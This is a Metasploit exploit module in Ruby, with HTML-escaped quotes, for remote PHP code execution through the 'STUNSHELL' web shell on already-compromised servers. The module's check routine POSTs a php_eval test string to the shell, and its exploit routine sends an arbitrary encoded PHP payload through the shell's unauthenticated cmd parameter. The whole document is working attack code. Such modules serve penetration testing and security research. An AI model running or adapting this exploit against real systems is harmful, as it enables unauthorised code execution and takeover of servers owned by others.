 
class Metasploit3 < Msf::Exploit::Remote
  Rank = GreatRanking
 
  include Msf::Exploit::Remote::HttpClient
 
  def initialize(info={})
    super(update_info(info,
      &#039;Name&#039;           => &#039;STUNSHELL Web Shell Remote PHP Code Execution&#039;,
      &#039;Description&#039;    => %q{
          This module exploits unauthenticated versions of the "STUNSHELL" web shell.
        This module works when safe mode is enabled on the web server. This shell is widely
        used in automated RFI payloads.
      },
      &#039;License&#039;        => MSF_LICENSE,
      &#039;Author&#039;         =>
        [
          &#039;bwall <bwall[at]openbwall.com>&#039; # vuln discovery & msf module
        ],
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://defense.ballastsecurity.net/wiki/index.php/STUNSHELL&#039;],
          [&#039;URL&#039;, &#039;https://defense.ballastsecurity.net/decoding/index.php?hash=a4cd8ba05eb6ba7fb86dd66bed968007&#039;]
        ],
      &#039;Privileged&#039;     => false,
      &#039;Payload&#039;        =>
        {
          &#039;Keys&#039;        => [&#039;php&#039;],
          &#039;Space&#039;       => 10000,
          &#039;DisableNops&#039; => true
        },
      &#039;Platform&#039;       => [&#039;php&#039;],
      &#039;Arch&#039;           => ARCH_PHP,
      &#039;Targets&#039;        =>
        [
          [&#039;stunshell&#039;, {}]
        ],
      &#039;DisclosureDate&#039; => &#039;Mar 23 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))
 
    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;,[true, "The path to the andalas_oku shell", "/IDC.php"]),
      ],self.class)
  end
 
  def check
    uri = normalize_uri(target_uri.path.to_s)
    request_parameters = {
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039;  =>
        {
          &#039;cmd&#039; => "php_eval",
          &#039;php_eval&#039; => "print &#039;andalas_oku test parameter&#039;;"
        }
    }
    shell = send_request_cgi(request_parameters)
    if (shell and shell.body =~ /andalas_oku test parameter/)
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end
 
  def http_send_command(cmd)
    uri = normalize_uri(target_uri.path.to_s)
    request_parameters = {
      &#039;method&#039;  => &#039;POST&#039;,
      &#039;uri&#039;    => uri,
      &#039;vars_post&#039;  =>
        {
          &#039;cmd&#039; => "php_eval",
          "php_eval" => cmd
        }
    }
    res = send_request_cgi(request_parameters)
  end
 
  def exploit
    http_send_command(payload.encoded)
  end
end

